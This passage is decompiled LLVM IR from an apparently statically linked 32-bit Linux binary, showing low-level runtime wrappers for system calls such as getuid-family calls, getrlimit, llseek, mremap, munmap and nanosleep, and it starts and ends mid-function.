  %v2_8051ea4 = inttoptr i32 %v1_8051ea4 to i32*
  %v3_8051ea4 = load i32, i32* %v2_8051ea4, align 4
  store i32 %v3_8051ea4, i32* %eax.global-to-local, align 4
  %v1_8051ea7 = add i32 %v0_8051eb032, 12
  %v2_8051ea7 = inttoptr i32 %v1_8051ea7 to i32*
  %v3_8051ea7 = load i32, i32* %v2_8051ea7, align 4
  %v1_8051eb0 = inttoptr i32 %v0_8051eb032 to i32*
  %v2_8051eb0 = load i32, i32* %v1_8051eb0, align 4
  store i32 %v2_8051eb0, i32* %eax.global-to-local, align 4
  %v1_8051eb2 = add i32 %v0_8051eb032, 4
  %v2_8051eb2 = inttoptr i32 %v1_8051eb2 to i32*
  %v3_8051eb2 = load i32, i32* %v2_8051eb2, align 4
  %v2_8051eb5 = add i32 %v1_8051eb531, 4
  %v3_8051eb5 = inttoptr i32 %v2_8051eb5 to i32*
  store i32 %v3_8051eb2, i32* %v3_8051eb5, align 4
  %v0_8051eb8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051eb8 = load i32, i32* @esi, align 4
  %v2_8051eb8 = inttoptr i32 %v1_8051eb8 to i32*
  store i32 %v0_8051eb8, i32* %v2_8051eb8, align 4
  %v0_8051eba = load i32, i32* @ebx, align 4
  %v1_8051eba = add i32 %v0_8051eba, 8
  %v2_8051eba = inttoptr i32 %v1_8051eba to i32*
  %v3_8051eba = load i32, i32* %v2_8051eba, align 4
  store i32 %v3_8051eba, i32* %eax.global-to-local, align 4
  %v1_8051ebd = add i32 %v0_8051eba, 12
  %v2_8051ebd = inttoptr i32 %v1_8051ebd to i32*
  %v3_8051ebd = load i32, i32* %v2_8051ebd, align 4
  %v1_8051ec0 = load i32, i32* @esi, align 4
  %v2_8051ec0 = add i32 %v1_8051ec0, 12
  %v3_8051ec0 = inttoptr i32 %v2_8051ec0 to i32*
  store i32 %v3_8051ebd, i32* %v3_8051ec0, align 4
  %v0_8051ec3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ec3 = load i32, i32* @esi, align 4
  %v2_8051ec3 = add i32 %v1_8051ec3, 8
  %v3_8051ec3 = inttoptr i32 %v2_8051ec3 to i32*
  store i32 %v0_8051ec3, i32* %v3_8051ec3, align 4
  %v0_8051ec6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051ec6 = trunc i32 %v0_8051ec6 to i16
  %v2_8051ec6 = load i32, i32* @esi, align 4
  %v3_8051ec6 = add i32 %v2_8051ec6, 16
  %v4_8051ec6 = inttoptr i32 %v3_8051ec6 to i16*
  store i16 %v1_8051ec6, i16* %v4_8051ec6, align 2
  %v0_8051eca = load i32, i32* @ebx, align 4
  %v1_8051eca = add i32 %v0_8051eca, 18
  %v2_8051eca = inttoptr i32 %v1_8051eca to i8*
  %v3_8051eca = load i8, i8* %v2_8051eca, align 1
  %v4_8051eca = zext i8 %v3_8051eca to i32
  %v5_8051eca = load i32, i32* %eax.global-to-local, align 4
  %v6_8051eca = and i32 %v5_8051eca, -256
  %v7_8051eca = or i32 %v6_8051eca, %v4_8051eca
  store i32 %v7_8051eca, i32* %eax.global-to-local, align 4
  %v2_8051ecd = load i32, i32* @esi, align 4
  %v3_8051ecd = add i32 %v2_8051ecd, 18
  %v4_8051ecd = inttoptr i32 %v3_8051ecd to i8*
  store i8 %v3_8051eca, i8* %v4_8051ecd, align 1
  %v0_8051ed0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ed0 = load i32, i32* @esp, align 4
  %v2_8051ed0 = add i32 %v1_8051ed0, -4
  %v3_8051ed0 = inttoptr i32 %v2_8051ed0 to i32*
  store i32 %v0_8051ed0, i32* %v3_8051ed0, align 4
  %v0_8051ed1 = load i32, i32* @ebx, align 4
  %v1_8051ed1 = add i32 %v0_8051ed1, 16
  %v2_8051ed1 = inttoptr i32 %v1_8051ed1 to i16*
  %v3_8051ed1 = load i16, i16* %v2_8051ed1, align 2
  %v4_8051ed1 = zext i16 %v3_8051ed1 to i32
  %v1_8051ed5 = add nsw i32 %v4_8051ed1, -19
  %v2_8051ed8 = add i32 %v1_8051ed0, -8
  %v3_8051ed8 = inttoptr i32 %v2_8051ed8 to i32*
  store i32 %v1_8051ed5, i32* %v3_8051ed8, align 4
  %v0_8051ed9 = load i32, i32* @ebx, align 4
  %v1_8051ed9 = add i32 %v0_8051ed9, 19
  %v2_8051edc = add i32 %v1_8051ed0, -12
  %v3_8051edc = inttoptr i32 %v2_8051edc to i32*
  store i32 %v1_8051ed9, i32* %v3_8051edc, align 4
  %v0_8051edd = load i32, i32* @esi, align 4
  %v1_8051edd = add i32 %v0_8051edd, 19
  store i32 %v1_8051edd, i32* %eax.global-to-local, align 4
  %v2_8051ee0 = add i32 %v1_8051ed0, -16
  %v3_8051ee0 = inttoptr i32 %v2_8051ee0 to i32*
  store i32 %v1_8051edd, i32* %v3_8051ee0, align 4
  %v3_8051ee1 = inttoptr i32 %v2_8051e72 to i16*
  %v4_8051ee1 = call i32 @function_805220a(i16* %v3_8051ee1, i32 %v3_8051ea4, i32 %v3_8051ea7)
  store i32 %v4_8051ee1, i32* %eax.global-to-local, align 4
  %v0_8051ee6 = load i32, i32* @ebx, align 4
  %v1_8051ee6 = add i32 %v0_8051ee6, 16
  %v2_8051ee6 = inttoptr i32 %v1_8051ee6 to i16*
  %v3_8051ee6 = load i16, i16* %v2_8051ee6, align 2
  %v4_8051ee6 = zext i16 %v3_8051ee6 to i32
  store i32 %v2_8051e72, i32* @esi, align 4
  %v2_8051eed = add i32 %v4_8051ee6, %v0_8051ee6
  store i32 %v2_8051eed, i32* @ebx, align 4
  %v0_8051eef = load i32, i32* @esp, align 4
  %v1_8051eef = add i32 %v0_8051eef, 16
  store i32 %v5_8051ef5, i32* %eax.global-to-local, align 4
  %v7_8051ef8 = icmp ult i32 %v2_8051eed, %v5_8051ef5
  br i1 %v7_8051ef8, label %dec_label_pc_8051e62, label %dec_label_pc_8051f00

dec_label_pc_8051f00:                             ; preds = %dec_label_pc_8051e49, %dec_label_pc_8051ea4, %dec_label_pc_8051e7c
  %v0_8051f00 = phi i32 [ %v0_8051e8f, %dec_label_pc_8051e7c ], [ %tmp14, %dec_label_pc_8051e49 ], [ %v2_8051e72, %dec_label_pc_8051ea4 ]
  store i32 %v0_8051f00, i32* %eax.global-to-local, align 4
  %v5_8051f02 = sub i32 %v0_8051f00, %tmp14
  br label %dec_label_pc_8051f05

dec_label_pc_8051f05:                             ; preds = %dec_label_pc_8051e94, %dec_label_pc_8051e34, %dec_label_pc_8051f00
  %storemerge = phi i32 [ %v5_8051f02, %dec_label_pc_8051f00 ], [ -1, %dec_label_pc_8051e34 ], [ -1, %dec_label_pc_8051e94 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8051dfe, i32* @ebx, align 4
  store i32 %v0_8051dfc, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8051f00, { 1, 0 }
  uselistorder i32 %v2_8051eed, { 0, 2, 1 }
  uselistorder i32 %v3_8051ea7, { 1, 0 }
  uselistorder i32 %v3_8051ea4, { 1, 2, 0 }
  uselistorder i32 %v2_8051e72, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8051e7c30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8051eb032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8051ef5, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8051e27, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_805220a, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 -12, { 0, 5, 27, 28, 18, 19, 20, 21, 7, 1, 22, 15, 13, 23, 9, 10, 16, 11, 12, 6, 17, 2, 24, 14, 8, 3, 25, 26, 4 }
  uselistorder i32 -8, { 0, 3, 33, 27, 29, 28, 30, 31, 32, 17, 18, 19, 20, 5, 6, 21, 14, 12, 22, 8, 9, 15, 10, 11, 4, 16, 23, 24, 13, 7, 1, 25, 26, 2 }
  uselistorder i32* @esp, { 9, 10, 11, 2, 3, 4, 22, 23, 24, 25, 26, 27, 28, 29, 85, 86, 5, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 7, 73, 8, 103, 104, 105, 17, 18, 19, 20, 21, 62, 63, 64, 65, 66, 67, 41, 42, 43, 44, 45, 46, 74, 75, 76, 0, 77, 78, 79, 80, 81, 82, 83, 84, 57, 58, 59, 60, 61, 68, 1, 69, 70, 71, 72, 106, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 12, 13, 14, 15, 16, 99, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 100, 101, 102, 107, 108, 109, 110, 137, 111, 112, 113, 114, 115, 117, 118, 116, 119, 120, 121, 122, 123, 124, 133, 134, 135, 125, 126, 127, 128, 129, 130, 131, 132, 6, 136 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 7, 43, 44, 31, 32, 33, 34, 11, 1, 35, 8, 25, 26, 21, 22, 17, 36, 37, 12, 13, 14, 15, 16, 27, 28, 18, 19, 20, 9, 10, 29, 30, 3, 38, 39, 23, 24, 2, 4, 5, 40, 41, 42, 6 }
  uselistorder i32 30, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f05, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051f00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051e62, { 1, 0 }
}

define i32 @function_8051f0d() local_unnamed_addr {
dec_label_pc_8051f0d:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051f10 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8051f17 = call i32 @function_8051fb7(i32 7, i32 %v2_8051f10)
  store i32 256, i32* @edx, align 4
  %v2_8051f24 = icmp slt i32 %v2_8051f17, 0
  br i1 %v2_8051f24, label %dec_label_pc_8051f2c, label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %dec_label_pc_8051f0d
  %v3_8051f28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8051f28, i32* @edx, align 4
  br label %dec_label_pc_8051f2c

dec_label_pc_8051f2c:                             ; preds = %dec_label_pc_8051f0d, %dec_label_pc_8051f28
  %v0_8051f2c = phi i32 [ 256, %dec_label_pc_8051f0d ], [ %v3_8051f28, %dec_label_pc_8051f28 ]
  ret i32 %v0_8051f2c

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 7, 8, 9, 6, 5 }
  uselistorder label %dec_label_pc_8051f2c, { 1, 0 }
}

define i32 @function_8051f32() local_unnamed_addr {
dec_label_pc_8051f32:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f32 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f32, i32* %stack_var_-4, align 4
  %v1_8051f3b = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051f3b, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051f3b, -4095
  br i1 %tmp7, label %dec_label_pc_8051f52, label %dec_label_pc_8051f46

dec_label_pc_8051f46:                             ; preds = %dec_label_pc_8051f32
  %v1_8051f46 = call i32 @function_804ffeb(i32 %v0_8051f32)
  %v0_8051f4b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f4b = sub i32 0, %v0_8051f4b
  %v2_8051f4d = inttoptr i32 %v1_8051f46 to i32*
  store i32 %v1_8051f4b, i32* %v2_8051f4d, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051f56.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f52

dec_label_pc_8051f52:                             ; preds = %dec_label_pc_8051f32, %dec_label_pc_8051f46
  %v2_8051f56 = phi i32 [ %v0_8051f32, %dec_label_pc_8051f32 ], [ %v2_8051f56.pre, %dec_label_pc_8051f46 ]
  %v0_8051f52 = phi i32 [ %v1_8051f3b, %dec_label_pc_8051f32 ], [ -1, %dec_label_pc_8051f46 ]
  store i32 %v2_8051f56, i32* @ebx, align 4
  ret i32 %v0_8051f52

; uselistorder directives
  uselistorder i32 %v1_8051f3b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f52, { 1, 0 }
}

define i32 @function_8051f58() local_unnamed_addr {
dec_label_pc_8051f58:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f58 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f58, i32* %stack_var_-4, align 4
  %v1_8051f61 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051f61, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051f61, -4095
  br i1 %tmp7, label %dec_label_pc_8051f78, label %dec_label_pc_8051f6c

dec_label_pc_8051f6c:                             ; preds = %dec_label_pc_8051f58
  %v1_8051f6c = call i32 @function_804ffeb(i32 %v0_8051f58)
  %v0_8051f71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f71 = sub i32 0, %v0_8051f71
  %v2_8051f73 = inttoptr i32 %v1_8051f6c to i32*
  store i32 %v1_8051f71, i32* %v2_8051f73, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051f7c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f78

dec_label_pc_8051f78:                             ; preds = %dec_label_pc_8051f58, %dec_label_pc_8051f6c
  %v2_8051f7c = phi i32 [ %v0_8051f58, %dec_label_pc_8051f58 ], [ %v2_8051f7c.pre, %dec_label_pc_8051f6c ]
  %v0_8051f78 = phi i32 [ %v1_8051f61, %dec_label_pc_8051f58 ], [ -1, %dec_label_pc_8051f6c ]
  store i32 %v2_8051f7c, i32* @ebx, align 4
  ret i32 %v0_8051f78

; uselistorder directives
  uselistorder i32 %v1_8051f61, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f78, { 1, 0 }
}

define i32 @function_8051f7e() local_unnamed_addr {
dec_label_pc_8051f7e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f7e = load i32, i32* @ebx, align 4
  store i32 %v0_8051f7e, i32* %stack_var_-4, align 4
  %v1_8051f87 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051f87, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051f87, -4095
  br i1 %tmp7, label %dec_label_pc_8051f9e, label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f7e
  %v1_8051f92 = call i32 @function_804ffeb(i32 %v0_8051f7e)
  %v0_8051f97 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f97 = sub i32 0, %v0_8051f97
  %v2_8051f99 = inttoptr i32 %v1_8051f92 to i32*
  store i32 %v1_8051f97, i32* %v2_8051f99, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051fa2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f9e

dec_label_pc_8051f9e:                             ; preds = %dec_label_pc_8051f7e, %dec_label_pc_8051f92
  %v2_8051fa2 = phi i32 [ %v0_8051f7e, %dec_label_pc_8051f7e ], [ %v2_8051fa2.pre, %dec_label_pc_8051f92 ]
  %v0_8051f9e = phi i32 [ %v1_8051f87, %dec_label_pc_8051f7e ], [ -1, %dec_label_pc_8051f92 ]
  store i32 %v2_8051fa2, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f9e

; uselistorder directives
  uselistorder i32 %v1_8051f87, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f9e, { 1, 0 }
}

define i32 @function_8051fa4() local_unnamed_addr {
dec_label_pc_8051fa4:
  %v0_8051fa4 = load i32, i32* @global_var_8053144.63, align 4
  %v1_8051fae = icmp eq i32 %v0_8051fa4, 0
  %.v0_8051fa4 = select i1 %v1_8051fae, i32 4096, i32 %v0_8051fa4
  store i32 %.v0_8051fa4, i32* @edx, align 4
  ret i32 %.v0_8051fa4

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8051fb7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051fb7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fb7, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051fca = call i32 @int80_syscall(i32 191)
  store i32 %v1_8051fca, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051fca, -4095
  br i1 %tmp9, label %dec_label_pc_8051fe3, label %dec_label_pc_8051fd7

dec_label_pc_8051fd7:                             ; preds = %dec_label_pc_8051fb7
  %v1_8051fd7 = call i32 @function_804ffeb(i32 %v0_8051fb7)
  %v0_8051fdc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fdc = sub i32 0, %v0_8051fdc
  %v2_8051fde = inttoptr i32 %v1_8051fd7 to i32*
  store i32 %v1_8051fdc, i32* %v2_8051fde, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051fe7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051fe3

dec_label_pc_8051fe3:                             ; preds = %dec_label_pc_8051fb7, %dec_label_pc_8051fd7
  %v2_8051fe7 = phi i32 [ %v0_8051fb7, %dec_label_pc_8051fb7 ], [ %v2_8051fe7.pre, %dec_label_pc_8051fd7 ]
  %v0_8051fe3 = phi i32 [ %v1_8051fca, %dec_label_pc_8051fb7 ], [ -1, %dec_label_pc_8051fd7 ]
  store i32 %v2_8051fe7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051fe3

; uselistorder directives
  uselistorder i32 %v1_8051fca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fe3, { 1, 0 }
}

define i32 @function_8051fe9() local_unnamed_addr {
dec_label_pc_8051fe9:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fe9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fe9, i32* %stack_var_-4, align 4
  %v1_8051ff2 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051ff2, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051ff2, -4095
  br i1 %tmp7, label %dec_label_pc_8052009, label %dec_label_pc_8051ffd

dec_label_pc_8051ffd:                             ; preds = %dec_label_pc_8051fe9
  %v1_8051ffd = call i32 @function_804ffeb(i32 %v0_8051fe9)
  %v0_8052002 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052002 = sub i32 0, %v0_8052002
  %v2_8052004 = inttoptr i32 %v1_8051ffd to i32*
  store i32 %v1_8052002, i32* %v2_8052004, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805200d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052009

dec_label_pc_8052009:                             ; preds = %dec_label_pc_8051fe9, %dec_label_pc_8051ffd
  %v2_805200d = phi i32 [ %v0_8051fe9, %dec_label_pc_8051fe9 ], [ %v2_805200d.pre, %dec_label_pc_8051ffd ]
  %v0_8052009 = phi i32 [ %v1_8051ff2, %dec_label_pc_8051fe9 ], [ -1, %dec_label_pc_8051ffd ]
  store i32 %v2_805200d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052009

; uselistorder directives
  uselistorder i32 %v1_8051ff2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052009, { 1, 0 }
}

define i32 @function_805200f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805200f:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_8052025 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052025, i32* %esi.global-to-local, align 4
  %v1_805203c = call i32 @int80_syscall(i32 140)
  store i32 %v1_805203c, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_805203c, -4095
  br i1 %tmp18, label %dec_label_pc_8052056, label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %dec_label_pc_805200f
  %v2_8052029 = ashr i32 %tmp8, 31
  %v1_8052048 = call i32 @function_804ffeb(i32 %v2_8052029)
  %v0_805204d = load i32, i32* %esi.global-to-local, align 4
  %v1_805204d = sub i32 0, %v0_805204d
  %v2_805204f = inttoptr i32 %v1_8052048 to i32*
  store i32 %v1_805204d, i32* %v2_805204f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805205a

dec_label_pc_8052056:                             ; preds = %dec_label_pc_805200f
  %v1_8052056 = icmp eq i32 %v1_805203c, 0
  br i1 %v1_8052056, label %dec_label_pc_805205f, label %dec_label_pc_805205a

dec_label_pc_805205a:                             ; preds = %dec_label_pc_8052056, %dec_label_pc_8052048
  %v0_805205a = phi i32 [ %v1_805203c, %dec_label_pc_8052056 ], [ -1, %dec_label_pc_8052048 ]
  br label %dec_label_pc_8052067

dec_label_pc_805205f:                             ; preds = %dec_label_pc_8052056
  %v3_805205f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8052067

dec_label_pc_8052067:                             ; preds = %dec_label_pc_805205a, %dec_label_pc_805205f
  %v0_805206d = phi i32 [ %v0_805205a, %dec_label_pc_805205a ], [ %v3_805205f, %dec_label_pc_805205f ]
  ret i32 %v0_805206d

; uselistorder directives
  uselistorder i32 %v1_805203c, { 1, 2, 0, 3 }
  uselistorder i32 31, { 5, 3, 0, 1, 4, 2, 6 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052067, { 1, 0 }
}

define i32 @function_805206e(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_805206e:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805206f = load i32, i32* @esi, align 4
  store i32 %v0_805206f, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052087 = load i32, i32* @ebx, align 4
  %v5_805208f = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_805208f = ptrtoint i32* %v5_805208f to i32
  store i32 %v0_8052087, i32* @ebx, align 4
  store i32 %v6_805208f, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_805208f, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_805209b, label %dec_label_pc_80520a7

dec_label_pc_805209b:                             ; preds = %dec_label_pc_805206e
  %v1_805209b = call i32 @function_804ffeb(i32 %v0_8052087)
  %v0_80520a0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80520a0 = sub i32 0, %v0_80520a0
  %v2_80520a2 = inttoptr i32 %v1_805209b to i32*
  store i32 %v1_80520a0, i32* %v2_80520a2, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80520aa.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80520a7

dec_label_pc_80520a7:                             ; preds = %dec_label_pc_805206e, %dec_label_pc_805209b
  %v2_80520aa = phi i32 [ %v0_805206f, %dec_label_pc_805206e ], [ %v2_80520aa.pre, %dec_label_pc_805209b ]
  %v0_80520a7 = phi i32 [ %v6_805208f, %dec_label_pc_805206e ], [ -1, %dec_label_pc_805209b ]
  store i32 %v2_80520aa, i32* @esi, align 4
  ret i32 %v0_80520a7

; uselistorder directives
  uselistorder i32 %v0_8052087, { 1, 0 }
  uselistorder label %dec_label_pc_80520a7, { 1, 0 }
}

define i32 @function_80520ad(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80520ad:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520ad = load i32, i32* @ebx, align 4
  store i32 %v0_80520ad, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80520c0 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80520c0, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80520c0, -4095
  br i1 %tmp10, label %dec_label_pc_80520d9, label %dec_label_pc_80520cd

dec_label_pc_80520cd:                             ; preds = %dec_label_pc_80520ad
  %v1_80520cd = call i32 @function_804ffeb(i32 %v0_80520ad)
  %v0_80520d2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520d2 = sub i32 0, %v0_80520d2
  %v2_80520d4 = inttoptr i32 %v1_80520cd to i32*
  store i32 %v1_80520d2, i32* %v2_80520d4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80520dd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80520d9

dec_label_pc_80520d9:                             ; preds = %dec_label_pc_80520ad, %dec_label_pc_80520cd
  %v2_80520dd = phi i32 [ %v0_80520ad, %dec_label_pc_80520ad ], [ %v2_80520dd.pre, %dec_label_pc_80520cd ]
  %v0_80520d9 = phi i32 [ %v3_80520c0, %dec_label_pc_80520ad ], [ -1, %dec_label_pc_80520cd ]
  %v2_80520db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80520db, i32* @edx, align 4
  store i32 %v2_80520dd, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80520d9

; uselistorder directives
  uselistorder i32 %v3_80520c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520d9, { 1, 0 }
}

define i32 @function_80520df(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80520df:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_80520df = load i32, i32* @ebx, align 4
  store i32 %v0_80520df, i32* %stack_var_-4, align 4
  %v4_80520e3 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80520e3, i32* %ebx.global-to-local, align 4
  %v6_80520f2 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_80520f2, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80520f2, -4095
  br i1 %tmp11, label %dec_label_pc_805210b, label %dec_label_pc_80520ff

dec_label_pc_80520ff:                             ; preds = %dec_label_pc_80520df
  %v1_80520ff = call i32 @function_804ffeb(i32 %v0_80520df)
  %v0_8052104 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052104 = sub i32 0, %v0_8052104
  %v2_8052106 = inttoptr i32 %v1_80520ff to i32*
  store i32 %v1_8052104, i32* %v2_8052106, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805210f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805210b

dec_label_pc_805210b:                             ; preds = %dec_label_pc_80520df, %dec_label_pc_80520ff
  %v2_805210f = phi i32 [ %v0_80520df, %dec_label_pc_80520df ], [ %v2_805210f.pre, %dec_label_pc_80520ff ]
  %v0_805210b = phi i32 [ %v6_80520f2, %dec_label_pc_80520df ], [ -1, %dec_label_pc_80520ff ]
  store i32 %v2_805210f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805210b

; uselistorder directives
  uselistorder i32 %v6_80520f2, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805210b, { 1, 0 }
}

define i32 @function_8052111(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052111:
  %stack_var_-12 = alloca i32, align 4
  %v0_8052112 = load i32, i32* @ebx, align 4
  %v0_8052116 = load i32, i32* @global_var_8053158.70, align 8
  %v1_8052116 = icmp eq i32 %v0_8052116, 0
  %v1_8052121 = icmp eq i1 %v1_8052116, false
  br i1 %v1_8052121, label %dec_label_pc_8052134, label %dec_label_pc_8052123

dec_label_pc_8052123:                             ; preds = %dec_label_pc_8052111
  %v1_8052128 = call i32 @function_80522ef(i32 0)
  %v2_8052130 = icmp slt i32 %v1_8052128, 0
  br i1 %v2_8052130, label %dec_label_pc_8052156, label %dec_label_pc_8052123.dec_label_pc_8052134_crit_edge

dec_label_pc_8052123.dec_label_pc_8052134_crit_edge: ; preds = %dec_label_pc_8052123
  %v0_8052136.pre = load i32, i32* @global_var_8053158.70, align 8
  br label %dec_label_pc_8052134

dec_label_pc_8052134:                             ; preds = %dec_label_pc_8052123.dec_label_pc_8052134_crit_edge, %dec_label_pc_8052111
  %v0_8052144 = phi i32 [ %v0_8052136.pre, %dec_label_pc_8052123.dec_label_pc_8052134_crit_edge ], [ %v0_8052116, %dec_label_pc_8052111 ]
  %v1_8052134 = icmp eq i32 %arg1, 0
  %v1_805213b = icmp eq i1 %v1_8052134, false
  store i32 %v0_8052144, i32* @ebx, align 4
  br i1 %v1_805213b, label %dec_label_pc_8052141, label %dec_label_pc_8052159

dec_label_pc_8052141:                             ; preds = %dec_label_pc_8052134
